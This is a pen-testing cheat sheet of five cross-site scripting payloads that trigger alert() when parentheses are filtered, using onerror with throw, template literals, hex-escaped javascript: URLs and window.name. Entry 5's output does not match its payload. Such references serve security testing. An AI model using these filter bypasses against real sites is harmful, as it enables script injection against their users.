1. XSS without Parentheses using Exception Handling
- Payload: <script>onerror=alert;throw 1</script>
- Condition: Input is reflected into HTML where parentheses () are filtered/blocked but < > and semicolons are NOT encoded
- Case: When () is blocked, use onerror to assign alert as the error handler and throw an exception to trigger it without parentheses
- Output: <script>onerror=alert;throw 1</script>

---

2. XSS without Parentheses using Exception Handling no Semicolons
- Payload: <script>{onerror=alert}throw 1</script>
- Condition: Input is reflected into HTML where parentheses () and semicolons ; are filtered/blocked
- Case: Use block syntax to assign onerror and throw to trigger alert without () or ;
- Output: <script>{onerror=alert}throw 1</script>

---

3. XSS without Parentheses using Template Strings
- Payload: <script>alert`1`</script>
- Condition: Input is reflected into HTML where parentheses () are filtered/blocked but backticks ` are NOT encoded
- Case: Use template literals (backticks) instead of parentheses to call alert
- Output: <script>alert`1`</script>

---

4. XSS without Parentheses using Location Redirect
- Payload: <script>location='javascript:alert\x281\x29'</script>
- Condition: Input is reflected into HTML where parentheses () are filtered/blocked
- Case: Use \x28 and \x29 (hex encoded parentheses) inside a javascript: protocol URL to bypass the filter
- Output: <script>location='javascript:alert\x281\x29'</script>

---

5. XSS without Parentheses using Location Name
- Payload: <script>location=name</script>
- Condition: Input is reflected into HTML where parentheses () are filtered/blocked
- Case: Use window.name to store the javascript: URL and redirect to it. Requires setting window.name first
- Output: <script>window.name='javascript:alert(1)';</script><svg onload=location=name>
